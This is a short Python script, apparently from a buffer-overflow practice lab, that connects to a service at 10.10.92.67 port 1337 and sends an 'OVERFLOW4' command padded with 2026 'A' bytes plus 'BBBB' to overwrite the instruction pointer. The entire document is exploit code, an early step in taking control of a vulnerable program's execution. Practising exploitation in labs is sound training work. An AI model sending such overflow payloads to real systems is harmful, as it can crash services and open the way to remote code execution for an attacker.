import socket

bof = b"A"*2026

eip = b"BBBB"


with socket.socket() as s:
    s.connect(("10.10.92.67", 1337))
    s.recv(1024)
    s.send(b"OVERFLOW4 " + bof + eip)
    print(s.recv(1024))